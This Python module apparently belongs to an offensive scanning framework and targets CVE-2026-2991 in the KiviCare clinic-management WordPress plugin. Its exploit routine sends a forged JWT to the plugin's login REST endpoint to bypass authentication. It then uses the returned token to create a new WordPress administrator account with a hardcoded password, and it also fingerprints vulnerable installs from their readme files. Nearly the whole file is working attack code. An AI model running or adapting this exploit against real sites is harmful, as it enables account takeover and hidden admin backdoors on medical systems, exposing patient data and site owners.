# Made by Sn0w8ird

from __future__ import annotations

import json
import os
from typing import Any, Dict

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE20262991KiviCare(WordPressModule):
    name = "CVE-2026-2991"
    severity = 9.8
    affected_versions = ["kivicare/plugin tree: verify against vendor advisory"]
    cwe = "CWE-287 (context-specific)"
    plugin_readme_paths = (
        "/wp-content/plugins/kivicare-clinic-management-system/readme.txt",
        "/wp-content/plugins/kivicare/readme.txt",
    )
    slug_hint = "kivicare"

    async def exploit_remote_primitive(
        self,
        client: CPointedClient,
        wp_path: str,
        *,
        target: Target,
        timeout: float,
    ) -> Dict[str, Any]:
        """
        REST ``/wp-json/kivicare/v1/users/login`` + Bearer follow-up to ``/wp-json/wp/v2/users``.
        Set ``CPOINTED_KIVICARE_LAB_JWT`` to your lab token from the advisory / PoC.
        """
        login_path = self._path_for_wp(wp_path, "/wp-json/kivicare/v1/users/login")
        jwt = os.environ.get(
            "CPOINTED_KIVICARE_LAB_JWT",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ.xxx",
        )
        payload = {"username": "administrator", "jwt": jwt}
        out: Dict[str, Any] = {"kivicare_login_status": None, "admin_created": False, "success": False}
        try:
            resp = await client.post(login_path, json=payload, timeout=timeout)
            out["kivicare_login_status"] = resp.status_code
            out["login_body_snippet"] = (resp.text or "")[:1500]
            if resp.status_code != 200:
                out["bypass_failed"] = True
                return out
            try:
                j = resp.json()
            except json.JSONDecodeError:
                out["bypass_failed"] = True
                return out
            if "token" not in j:
                out["bypass_failed"] = True
                return out
            admin_token = j["token"]
            create_path = self._path_for_wp(wp_path, "/wp-json/wp/v2/users")
            create_user = await client.post(
                create_path,
                json={
                    "username": "cpointed_admin",
                    "password": "StrongP@ssw0rdCpointed!",
                    "email": "cpointed_admin@local.invalid",
                    "roles": ["administrator"],
                },
                headers={"Authorization": f"Bearer {admin_token}"},
                timeout=timeout,
            )
            out["wp_user_create_status"] = create_user.status_code
            out["wp_user_create_snippet"] = (create_user.text or "")[:1500]
            out["admin_created"] = create_user.status_code == 201
            out["token_obtained"] = True
            out["success"] = out["admin_created"]
        except Exception as exc:  # pragma: no cover - network
            out["error"] = str(exc)
        return out

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
